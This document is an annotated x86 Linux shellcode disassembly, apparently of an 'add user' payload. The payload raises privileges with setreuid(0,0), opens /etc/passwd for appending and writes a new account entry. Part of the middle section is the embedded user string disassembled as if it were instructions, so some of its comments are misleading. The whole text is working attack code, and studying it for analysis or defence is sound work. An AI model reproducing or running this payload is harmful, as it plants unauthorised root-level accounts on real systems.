; setreuid(0, 0);
push byte +0x46          ; push 0x46 to stack
pop eax                  ; pop 0x46 into eax
int 0x80                 ; executes system call setreuid 
; open("/etc//passwd", 0x401, 0);
push byte +0x5           ; push 0x5 to stack
pop eax                  ; pop 0x5 to stack
xor ecx,ecx              ; zeroes out ecx
push ecx                 ; push null byte to stack
push dword 0x64777373    
push dword 0x61702f2f
push dword 0x6374652f    ; push /etc//passwd to stack
mov ebx,esp              ; move pointer to /etc//passwd to ebx
inc ecx                  ; set ecx to 1
mov ch,0x4               ; set ch to 0x4 making ecx equal 0x401
int 0x80                 ; executes system call open
; write(<file descriptor from open()>, <new user>, <total bytes>)
xchg eax,ebx             ; moves result from open() into ebx
call 0x4d                ; create loop to start building new user 
                         ;   string
jz 0x92
jnc 0xa3
cmp al,[ecx+0x7a]
xor eax,0x70503651
inc edi                  ; increasing edi (number of bytes to write)
ja 0x9e
dec ebx                  ; decrease the file descriptor value
push edi                 ; moving current # total bytes to stack
arpl [edx],di            
xor [edx],bh                                 
xor [edx],bh             
cmp ch,[edi]         
cmp ch,[edi]
bound ebp,[ecx+0x6e]
das
jnc 0xb4
or bl,[ecx-0x75]         
push ecx                 ; pushes address of new user string to  
                         ;   stack
cld
push byte +0x4           ; push 0x4 to stack
pop eax                  ; mov 0x4 to eax (sys_write)
int 0x80                 ; executes system call write
; exit(1);
push byte +0x1           ; pushing 0x1 to the stack
pop eax                  ; moving 0x1 into eax (sys_exit)
int 0x80                 ; executes sys_exit
